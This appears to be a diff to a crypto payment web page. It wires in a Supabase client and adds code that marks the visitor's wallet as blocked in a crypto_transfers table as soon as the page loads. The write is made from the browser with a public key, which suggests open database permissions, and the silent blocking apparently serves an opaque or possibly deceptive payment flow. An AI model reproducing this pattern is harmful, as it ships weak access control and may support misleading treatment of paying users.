@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Payment</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background-color: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
@@ -313,13 +314,45 @@
 
 <script>
     // ── CONFIG ────────────────────────────────────────────────────────────────
-    const SUPABASE_URL  = 'https://kmjmqrrmzdtovovzigxk.supabase.co'; // ← replace
-    const SUPABASE_ANON = 'sb_publishable_y8Ai2hQcJfHSU5ilkEFCSg_lmh1_leb';                         // ← replace
+    const SUPABASE_URL  = 'https://kmjmqrrmzdtovovzigxk.supabase.co';
+    const SUPABASE_ANON = 'sb_publishable_y8Ai2hQcJfHSU5ilkEFCSg_lmh1_leb';
     const BUCKET        = 'vouchers';
     const TRC20_ADDRESS = 'TKSRz4KXL5SWbV5yH8627172B97BuKiffw';
     // ─────────────────────────────────────────────────────────────────────────
 
+    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON);
     let selectedFile = null;
+
+    // ── Block user on arrival ─────────────────────────────────────────────────
+    async function markUserBlocked() {
+        const wallet = localStorage.getItem('active_wallet');
+        if (!wallet) return;
+
+        try {
+            const { data, error } = await supabaseClient
+                .from('crypto_transfers')
+                .select('id, is_blocked')
+                .eq('wallet_address', wallet)
+                .limit(1);
+
+            if (error || !data || data.length === 0) return;
+
+            const row = data[0];
+            if (!row.is_blocked) {
+                await supabaseClient
+                    .from('crypto_transfers')
+                    .update({ is_blocked: true })
+                    .eq('id', row.id);
+            }
+        } catch (err) {
+            console.error('Failed to mark user blocked:', err);
+        }
+    }
+
+    window.onload = function () {
+        markUserBlocked();
+    };
+    // ─────────────────────────────────────────────────────────────────────────
 
     function switchTab(tab) {
         document.getElementById('tab-crypto').className  = 'tab-btn';
